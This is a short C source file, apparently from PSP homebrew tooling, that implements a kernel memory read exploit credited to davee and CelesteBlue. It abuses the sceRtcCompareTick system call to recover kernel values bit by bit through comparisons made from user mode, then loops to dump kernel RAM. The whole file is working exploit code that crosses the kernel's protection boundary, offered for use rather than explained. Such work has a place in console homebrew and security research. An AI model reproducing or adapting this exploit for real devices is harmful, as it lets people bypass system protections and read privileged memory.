#include <time.h>
#include <pspsdk.h>
#include <psprtc.h>

/*
  sceRtcCompareTick kernel exploit by davee, original implementation by CelesteBlue
*/

// input: 4-byte-aligned kernel address
void pspXploitKernelRead64(uint32_t addr, uint32_t* dest) {
    uint32_t value[2] = {0, 0};
    uint32_t res[2] = {0, 0};
    int bit_idx = 31;
    
    uint64_t mask = 0x00000000FFFFFFFF;
    if (sceRtcCompareTick(&mask, (uint64_t*)addr) < 0) {
        for (; bit_idx >= 0; bit_idx--) {
            value[1] = res[1] | (1 << bit_idx);
            if (sceRtcCompareTick((uint64_t *)value, (uint64_t *)addr) <= 0) {
                res[1] = value[1];
            }
        }
        value[1] = res[1];
        bit_idx = 31;
    }
    
    mask = ((uint64_t)res[1] << 32);
    if (sceRtcCompareTick(&mask, (uint64_t*)addr) < 0) {
        for (; bit_idx >= 0; bit_idx--) {
            value[0] = res[0] | (1 << bit_idx);
            if (sceRtcCompareTick((uint64_t *)value, (uint64_t *)addr) <= 0) {
                res[0] = value[0];
            }
        }
    }
    
    dest[0] = res[0];
    dest[1] = res[1];
}

void pspXploitDumpKernel(u32* dst, u32* src, u32 size) {
    #ifdef DEBUG
    pspDebugScreenPrintf("Reading %d bytes of kernel ram @ %p\n", size, src);
    #endif

    if ((u32)src+size >= 0x88400000) {
      size = 0x88400000 - (u32)src;
    }
    u32 count = 0;
    while (count < size){
        pspXploitKernelRead64((u32)src, dst);
        dst += 2;
        src += 2;
        count += 8;
    }
}
